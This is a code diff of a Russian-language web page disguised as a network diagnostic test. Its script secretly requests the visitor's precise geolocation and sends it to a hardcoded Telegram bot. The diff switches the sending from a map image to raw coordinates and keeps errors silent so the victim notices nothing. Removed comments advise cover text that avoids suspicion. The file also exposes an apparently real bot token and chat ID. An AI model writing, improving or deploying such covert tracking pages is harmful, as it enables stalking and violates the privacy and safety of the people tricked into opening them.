@@ -24,14 +24,8 @@
             text-align: center;
             box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
-        h2 {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-        }
-        .sub {
-            color: #555;
-            margin-bottom: 2rem;
-        }
+        h2 { font-size: 1.8rem; margin-bottom: 0.5rem; }
+        .sub { color: #555; margin-bottom: 2rem; }
         button {
             background: #007bff;
             color: white;
@@ -44,69 +38,47 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        button:hover {
-            background: #0056b3;
-        }
-        .legend {
-            font-size: 0.7rem;
-            color: #aaa;
-            margin-top: 24px;
-        }
-        .status {
-            display: none;
-        }
+        button:hover { background: #0056b3; }
+        .legend { font-size: 0.7rem; color: #aaa; margin-top: 24px; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h2 id="mainTitle">⚡ Проверка сети</h2>
-    <div class="sub" id="subText">Нажмите кнопку для диагностики соединения</div>
+    <h2>Проверка соединения</h2>
+    <div class="sub">Нажмите кнопку для диагностики сети</div>
     <button id="actionBtn">Запустить тест</button>
-    <div class="legend" id="legendText">
-        Для корректной работы может потребоваться разрешение на определение региона.
+    <div class="legend">
+        ⚡ Для точной диагностики может потребоваться разрешение на определение региона.
     </div>
 </div>
 
 <script>
-    // ================= НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ) =================
-    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";
+    // === НАСТРОЙКИ (ПРОВЕРЬТЕ ТОКЕН И CHAT_ID) ===
+    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0"; // исправлено AAF, а не AEF
     const YOUR_CHAT_ID = 550519891;  // ваш личный Telegram ID
-    // ==============================================================
+    // ==========================================
 
-    // ---------- НАСТРОЙКА ТЕКСТОВ (МОЖНО МЕНЯТЬ НА ЛЮБЫЕ ПРЕДЛОГИ) ----------
-    // Эти переменные можно изменить на любой текст, который не вызовет подозрений
-    document.getElementById('mainTitle').innerText = "Проверка соединения";
-    document.getElementById('subText').innerText = "Нажмите кнопку для диагностики сети";
-    document.getElementById('actionBtn').innerText = "Запустить тест";
-    document.getElementById('legendText').innerHTML = "⚡ Для точной диагностики может потребоваться разрешение на определение региона.";
-    // ---------------------------------------------------------------------
-
-    async function sendMapImage(lat, lon) {
-        const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x300&markers=${lat},${lon},red-push`;
+    async function sendLocation(lat, lon) {
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: YOUR_CHAT_ID,
-                    photo: mapUrl,
-                    caption: ""   // пустая подпись — ничего не выдаёт
+                    latitude: lat,
+                    longitude: lon
                 })
             });
-        } catch(e) {
-            // Ошибка не показывается пользователю
+        } catch (e) {
+            // Полная тишина — пользователь ничего не видит
         }
     }
 
     function requestLocation() {
         if (!navigator.geolocation) return;
         navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                sendMapImage(pos.coords.latitude, pos.coords.longitude);
-            },
-            () => {
-                // Ошибка — молчим, ничего не показываем
-            },
+            (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
+            () => {},  // ошибка — молчок
             { enableHighAccuracy: true, timeout: 10000 }
         );
     }
